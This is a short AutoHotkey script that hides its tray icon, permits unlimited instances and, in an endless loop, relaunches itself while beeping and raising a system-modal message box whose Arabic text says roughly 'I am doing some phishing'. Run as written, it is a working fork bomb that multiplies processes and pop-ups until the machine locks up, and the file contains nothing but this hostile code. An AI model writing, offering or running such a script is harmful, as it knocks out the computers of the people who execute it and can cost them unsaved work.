#NoEnv
SendMode Input
SetWorkingDir %A_ScriptDir%

#Persistent
#NoTrayIcon
#SingleInstance, off

Loop {
	Run, %A_ScriptFullPath%
	SoundBeep
	MsgBox, 1310736, SystematicError//:!, أنا أفعل بعض التصيد
}
